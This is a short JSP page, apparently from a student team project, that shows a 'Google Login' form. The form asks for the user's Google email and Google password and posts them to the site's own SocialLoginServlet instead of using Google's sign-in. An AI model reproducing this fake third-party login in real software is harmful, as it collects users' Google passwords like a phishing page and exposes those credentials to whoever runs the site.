<!-- Robert Villarreal Silver Team -->
<%-- Silver Team: Nathan Le, Ivan Lopez-Kne, Trevor Michaels, Keith Olsen, Robert Villarreal --%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ include file="Header.jsp" %>
<head>
    <title>Google Login</title>
    <link rel="stylesheet" type="text/css" href="LoginStyle.css">
</head>
<body>

<div class="container">
    <h2>Google Login</h2>
    <hr>
    <form action="SocialLoginServlet" method="POST">
    <input type="email" name="email" placeholder="Google Email" required><br>
    <input type="hidden" name="source" value="google">
    <input type="password" name="password" placeholder="Google Password" required><br>
    <input type="submit" value="Log in with Google">
</form>
    <a href="Login.jsp">Return to Login</a> 
</div>

</body>
</html>
